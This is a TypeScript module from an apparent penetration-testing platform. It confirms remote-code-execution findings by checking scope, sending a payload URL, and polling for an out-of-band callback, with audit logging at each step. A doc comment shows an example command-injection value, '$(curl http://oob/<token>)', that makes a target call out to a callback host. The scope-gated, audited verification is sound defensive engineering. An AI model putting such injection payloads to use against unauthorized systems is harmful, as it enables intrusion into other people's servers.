// Sprint 20 — RCE replay validator. OOB-augmented shell payload confirmation.
//
// Audit ownership (M1):
//   - validator.rce.replay_denied reason:'no_scope'           → worker (handleRceReplay step 6)
//   - validator.rce.replay_denied reason:'assessment_mismatch'→ worker (handleRceReplay step 4)
//   - validator.rce.replay_denied reason:<engine deny>        → this file (decide() denied)
//   - validator.rce.confirmed                                 → this file (OOB callback match)
//   - validator.rce.unmatched                                 → this file (timeout, no OOB match)
//   - validator.rce.fetch_failed                              → this file (httpClient.get throw)
//
// Scope gate BEFORE network egress (S13 per-candidate-gate lesson):
//   1. scope is EffectiveScope (non-null — worker guards null before calling us).
//   2. Call decide(scope, {kind:'http_request', url:affectedUrl, method:'GET'}, scopeDeps).
//   3. Denied → emit validator.rce.replay_denied, return out_of_scope. Zero HTTP calls.
//   4. Allowed → GET affectedUrl (with embedded OOB token) via injected httpClient.
//   5. Fetch error → emit validator.rce.fetch_failed, return fetch_failed (terminal — S19 MED-1).
//   6. Poll oobCallbackLoader(token) every 500ms until match or oobVerifyTimeoutMs elapsed.
//   7. Match → emit validator.rce.confirmed, return confirmed (worker inserts finding).
//   8. Timeout → emit validator.rce.unmatched, return unmatched.

import type { AuditAction } from '@cyberstrike/contracts';
import { type EffectiveScope, decide } from '@cyberstrike/scope-engine';
import type { ValidatorScopeDeps } from '@cyberstrike/validators';
import type { AuditEmitter, AuditEmitterArgs } from './worker.ts';

const VALIDATOR_WORKER_ACTOR_ID = 'validator-worker' as const;
const POLL_INTERVAL_MS = 500;

export interface RceValidatorInput {
  readonly candidateFindingId: string;
  readonly tenantId: string;
  readonly assessmentId: string;
  readonly projectId?: string | null;
  /** Token-embedded URL, e.g. http://target/api?cmd=$(curl http://oob/<token>)&_cs_token=<token> */
  readonly affectedUrl: string;
  readonly token: string;
  readonly scope: EffectiveScope;
  readonly traceId: string;
}

export interface RceValidatorDeps {
  readonly scopeDeps: ValidatorScopeDeps;
  readonly auditEmitter: AuditEmitter;
  readonly httpClient: { get(url: string): Promise<void>; readonly callCount: number };
  readonly oobCallbackLoader: (token: string) => Promise<boolean>;
  readonly oobVerifyTimeoutMs?: number;
}

export type RceValidationStatus =
  | 'confirmed'
  | 'unmatched'
  | 'out_of_scope'
  | 'fetch_failed'
  | 'inconclusive';

export interface RceValidationResult {
  readonly status: RceValidationStatus;
  readonly reason?: string;
}

const emitRceAudit = async (
  auditEmitter: AuditEmitter,
  input: RceValidatorInput,
  action: AuditAction,
  outcome: 'success' | 'denied',
  metadata: Record<string, unknown>,
): Promise<void> => {
  const args: AuditEmitterArgs = {
    tenantId: input.tenantId,
    action,
    outcome,
    actorType: 'service',
    actorId: VALIDATOR_WORKER_ACTOR_ID,
    actorName: 'validator-worker',
    resourceType: 'candidate_finding',
    resourceId: input.candidateFindingId,
    ...(input.projectId ? { projectId: input.projectId } : {}),
    assessmentId: input.assessmentId,
    ip: 'validator-worker',
    userAgent: null,
    traceId: input.traceId,
    metadata,
  };
  await auditEmitter(args);
};

const sleep = (ms: number): Promise<void> => new Promise((resolve) => setTimeout(resolve, ms));

export const validateRceCandidate = async (
  input: RceValidatorInput,
  deps: RceValidatorDeps,
): Promise<RceValidationResult> => {
  const timeoutMs = deps.oobVerifyTimeoutMs ?? 10_000;

  // 1. Scope gate BEFORE any network egress. scope is always non-null here (worker guards it).
  const decision = await decide(
    input.scope,
    { kind: 'http_request', url: input.affectedUrl, method: 'GET' },
    deps.scopeDeps,
  );

  if (!decision.allowed) {
    await emitRceAudit(deps.auditEmitter, input, 'validator.rce.replay_denied', 'denied', {
      reason: decision.reason,
      affectedUrl: input.affectedUrl,
    });
    return { status: 'out_of_scope', reason: decision.reason };
  }

  // 2. Trigger shell payload — GET affectedUrl (OOB token already embedded by coordinator).
  //    Fetch error → terminal fetch_failed audit (no retry — S19 MED-1 lesson).
  try {
    await deps.httpClient.get(input.affectedUrl);
  } catch (err) {
    await emitRceAudit(deps.auditEmitter, input, 'validator.rce.fetch_failed', 'denied', {
      affectedUrl: input.affectedUrl,
      error: err instanceof Error ? err.message : String(err),
    });
    return { status: 'fetch_failed', reason: err instanceof Error ? err.message : String(err) };
  }

  // 3. Poll for OOB callback match — shell execution on target calls back to OOB receiver.
  //    oobCallbackLoader is wrapped in try/catch (codex MED/P2): if the OOB store is
  //    unavailable the shell command has already fired; we must NOT re-queue (that would
  //    re-execute the shell payload). Return terminal inconclusive instead.
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    let matched: boolean;
    try {
      matched = await deps.oobCallbackLoader(input.token);
    } catch (pollErr) {
      await emitRceAudit(deps.auditEmitter, input, 'validator.rce.replay_denied', 'denied', {
        reason: 'oob_lookup_error',
        error: pollErr instanceof Error ? pollErr.message : String(pollErr),
        affectedUrl: input.affectedUrl,
      });
      return { status: 'inconclusive', reason: 'oob_lookup_error' };
    }
    if (matched) {
      await emitRceAudit(deps.auditEmitter, input, 'validator.rce.confirmed', 'success', {
        token: input.token,
        affectedUrl: input.affectedUrl,
      });
      return { status: 'confirmed' };
    }
    const remaining = deadline - Date.now();
    if (remaining <= 0) break;
    await sleep(Math.min(POLL_INTERVAL_MS, remaining));
  }

  // 4. Timeout — no OOB callback arrived within window.
  await emitRceAudit(deps.auditEmitter, input, 'validator.rce.unmatched', 'success', {
    token: input.token,
    affectedUrl: input.affectedUrl,
    timeoutMs,
  });
  return { status: 'unmatched' };
};
